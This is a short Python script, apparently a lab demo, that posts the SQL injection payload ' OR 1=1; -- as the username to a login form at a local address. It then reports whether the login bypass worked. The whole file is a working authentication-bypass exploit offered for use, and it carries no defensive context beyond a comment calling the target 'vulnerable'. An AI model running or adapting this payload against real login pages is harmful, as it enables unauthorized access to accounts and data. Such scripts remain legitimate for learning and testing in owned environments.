import requests

# Replace this URL with the address where your vulnerable web application is running
VULNERABLE_APP_URL = "http://127.0.0.1:5000/login"


def perform_sql_injection_attack():
    # SQL injection payload
    payload = "' OR 1=1; --"

    # Construct the login data with the SQL injection payload
    login_data = {
        'username': payload,
        'password': 'any_password'
    }

    # Send a POST request to the login endpoint with the payload
    response = requests.post(VULNERABLE_APP_URL, data=login_data)

    # Check if the attack was successful
    if "Hello, " in response.text:
        print("SQL Injection attack successful! The application returned:")
        print(response.text)
    else:
        print("The SQL Injection attack was not successful.")


if __name__ == "__main__":
    perform_sql_injection_attack()
